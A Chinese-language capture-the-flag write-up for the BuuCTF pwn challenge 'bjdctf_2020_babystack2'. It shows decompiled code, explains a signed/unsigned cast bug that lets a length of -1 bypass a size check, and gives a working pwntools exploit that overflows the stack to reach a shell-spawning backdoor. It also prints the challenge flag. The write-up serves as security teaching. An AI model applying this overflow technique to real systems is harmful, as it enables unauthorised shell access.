---
tags:
  - BuuCTF
  - 简单
  - 整数溢出
---

# bjdctf_2020_babystack2

## 前置工作

先 CheckSec 一波，结果如下

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ checksec bjdctf_2020_babystack2 
[*] '/home/ela/Pwn/bjdctf_2020_babystack2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

开启了 NX，其他没啥

用 IDA 64 反编译一下主程序

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[12]; // [rsp+0h] [rbp-10h] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  if ( (int)nbytes > 10 )
  {
    puts("Oops,u name is too long!");
    exit(-1);
  }
  puts("[+]What's u name?");
  read(0, buf, (unsigned int)nbytes);
  return 0;
}
```

在仔细找找，发现在 `0x400726` 上有后门函数 `backdoor()`

```c
__int64 backdoor()
{
  system("/bin/sh");
  return 1LL;
}
```

## 解决思路

这道题的关键在于变量 `nbytes` 的利用，`nbytes` 在声明的时候是作为 `size_t` 声明出来的，本身属于无符号整型，但在 `if ( (int)nbytes > 10 )` 中被强制转换成了有符号的整型 `int`，造成了整数溢出

作为初学者，我也不知道上面说的是不是真的，所以我自己试了一下，写了个 C 程序

```c
#include "stdio.h"

int main() {
    unsigned int nbytes;
    scanf("%d", &nbytes);
    if ((int) nbytes > 10) {
        puts("signed > 10");
    }
    if ((unsigned int) nbytes > 10) {
        puts("unsigned > 10");
    }
    return 0;
}
```

当你输入 `100` 的时候，输出如下

```
signed > 10
unsigned > 10
```

当你输入 `-100` 或者 `-1` 的时候，输出如下

```
unsigned > 10
```

我们就可以将 `nbytes` 定为 `-1`，就能绕过最大长度 10 的限制，知道这个原理过后，我们可以编写 Exp

## 编写 Exp

```python
from pwn import *

io = remote("node4.buuoj.cn", 26082)
backdoor = 0x400726
io.recvuntil("[+]Please input the length of your name:")
io.sendline("-1")
io.recvuntil("[+]What's u name?")
payload = b"A"*(0x10+0x8) + pack(backdoor, 64)
io.sendline(payload)
io.interactive()

```

运行后使用 `cat flag`，获得 Flag 是 `flag{13c76a46-00ba-4c35-9f65-3ffde7e913e2}`